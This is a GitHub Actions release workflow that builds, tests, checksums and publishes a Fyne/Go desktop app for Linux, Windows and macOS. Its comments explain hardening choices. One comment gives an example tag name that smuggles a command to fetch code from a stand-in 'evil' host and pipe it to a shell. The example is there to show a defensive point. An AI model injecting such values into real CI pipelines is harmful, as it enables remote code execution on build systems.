name: Release Build

# Cost-disciplined: this NEVER runs on a normal push. It builds ONLY when you cut
# a release (push a v* tag) or trigger it by hand (workflow_dispatch). A plain
# commit to any branch — including main — runs zero Actions minutes.
#
# Fyne uses cgo, so each platform must build NATIVELY with its own C toolchain —
# GOOS cross-compilation from one runner is not possible. Runner billing:
# ubuntu 1x, windows 2x, macOS 10x; acceptable because this fires only on
# releases, not per push.
on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: true

# Read-only by default. Only the `release` job — the one that actually publishes —
# is granted write, so a compromised build step (a hijacked apt/choco package, a
# malicious cgo directive) cannot reach a push-capable token.
permissions:
  contents: read

jobs:
  build:
    name: Build ${{ matrix.target }}
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: ubuntu-latest # 1x billing
            target: linux-amd64
          - os: windows-latest # 2x billing
            target: windows-amd64
          - os: macos-latest # 10x billing — Apple Silicon (arm64)
            target: darwin-arm64
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          # Don't leave the job's token sitting in .git/config where any step —
          # including the C toolchain — can read it. Nothing here pushes.
          persist-credentials: false

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.24'

      - name: Install Linux GUI build deps
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc libgl1-mesa-dev xorg-dev libxkbcommon-dev

      - name: Install MinGW (gcc)
        if: runner.os == 'Windows'
        run: choco install mingw --no-progress -y
        shell: pwsh

      # Tests before the build, on every platform in the matrix. This is the
      # ONLY place the suite runs on macOS and Linux — the dev machine is
      # Windows, and Fyne's cgo/OpenGL dependency means nothing cross-compiles,
      # so without this a release could ship a binary whose tests have never
      # passed on that platform. It also runs first so a failure stops the
      # release rather than being discovered after publishing.
      - name: Test
        run: go test ./...
        env:
          CGO_ENABLED: '1'

      # -s -w strip the symbol table and DWARF debug info. Fyne is inherently
      # large (statically-linked GUI toolkit + embedded CJK font), so -s -w is
      # the realistic size win. The tar.gz for Linux/macOS preserves the exec
      # bit, which a bare uploaded binary would lose.
      - name: Build (Linux)
        if: runner.os == 'Linux'
        env:
          CGO_ENABLED: '1'
          # Via env, never interpolated into the script text: ${{ }} expands
          # BEFORE the shell runs, so a tag named `v1.0.0";curl evil|sh;#` would
          # execute as script rather than be quoted as data.
          REF_NAME: ${{ github.ref_name }}
          TARGET: ${{ matrix.target }}
        run: |
          go build -ldflags "-s -w -X github.com/AlgoraLabs-AI/AI-Cloud-Status/internal/ui.Version=${REF_NAME}" -o AI-Cloud-Status .
          tar -czf "AI-Cloud-Status-${TARGET}.tar.gz" AI-Cloud-Status

      # macOS ships an .app BUNDLE, not the bare executable the other two ship.
      # A bare Mach-O is typed "public.unix-executable", and the only way Finder
      # knows to open one is to hand it to Terminal.app — so double-clicking the
      # v1.0.0-candidate artifact opened a stray Terminal window that OWNED the
      # app, and closing that window killed it. Verified on macOS 26.5.2:
      # bare binary -> parent is a Terminal `-zsh`; bundle -> parent is launchd.
      - name: Build (macOS)
        if: runner.os == 'macOS'
        env:
          REF_NAME: ${{ github.ref_name }} # see the note on the Linux step
          TARGET: ${{ matrix.target }}
        run: |
          ./scripts/package-darwin.sh "${REF_NAME}"
          tar -czf "AI-Cloud-Status-${TARGET}.tar.gz" AI-Cloud-Status.app

      - name: Build (Windows)
        if: runner.os == 'Windows'
        shell: pwsh
        env:
          CGO_ENABLED: '1'
          REF_NAME: ${{ github.ref_name }} # see the note on the Linux/macOS step
        run: go build -ldflags "-s -w -H=windowsgui -X github.com/AlgoraLabs-AI/AI-Cloud-Status/internal/ui.Version=$env:REF_NAME" -o AI-Cloud-Status-windows-amd64.exe .

      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: AI-Cloud-Status-${{ matrix.target }}
          path: |
            AI-Cloud-Status-*.tar.gz
            AI-Cloud-Status-*.exe
          if-no-files-found: error

  # A single release job (1x runner) collects all three artifacts and attaches
  # them to the GitHub Release — keeping release creation out of the matrix
  # avoids three jobs racing to create the same release.
  release:
    name: Create Release
    needs: build
    if: startsWith(github.ref, 'refs/tags/v')
    runs-on: ubuntu-latest
    permissions:
      contents: write # the only job that needs it: it publishes the Release
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          merge-multiple: true

      # The binaries are unsigned, so a checksum file is the only thing a user
      # (or a downstream packager) can verify a download against.
      - name: Generate checksums
        run: sha256sum AI-Cloud-Status-*.tar.gz AI-Cloud-Status-*.exe > SHA256SUMS.txt

      - name: Attach binaries to GitHub Release
        # Pinned to a commit, not the mutable `v2` tag: this is the one
        # third-party action in the only job holding a write-scoped token, so a
        # tag repoint upstream would otherwise run attacker code next to the
        # artifacts it is about to publish.
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2
        with:
          files: |
            AI-Cloud-Status-*.tar.gz
            AI-Cloud-Status-*.exe
            SHA256SUMS.txt
          generate_release_notes: true
